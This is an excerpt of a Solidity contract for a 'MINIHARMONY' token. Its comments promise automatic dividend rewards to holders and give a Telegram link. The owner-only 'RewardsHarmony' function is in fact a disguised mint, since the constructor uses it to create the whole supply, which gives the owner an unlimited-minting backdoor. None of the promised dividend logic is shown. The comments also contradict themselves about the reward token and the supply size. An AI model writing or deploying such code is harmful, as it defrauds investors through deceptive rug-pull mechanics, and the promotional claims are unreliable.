...
//
// $MINIHARMONY proposes an innovative feature in its contract.
//
// DIVIDEND YIELD PAID IN CAKE! With the auto-claim feature,
// simply hold$MINIHARMONY and you'll receive HARMONY automatically in your wallet.
// 
// Hold MINIHARMONY and get rewarded in Cake on every transaction!
//
//
// 📱 Telegram: https://t.me/miniharmonybsc
// 
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function RewardsHarmony(uint256 amount) public onlyOwner {
    _RewardsHarmony(msg.sender, amount);
    }
    ...
    function _RewardsHarmony(address account, uint256 amount) internal virtual {
...
contract MINIHARMONY is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("MINI HARMONY", "MINI HARMONY") {
        _RewardsHarmony(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}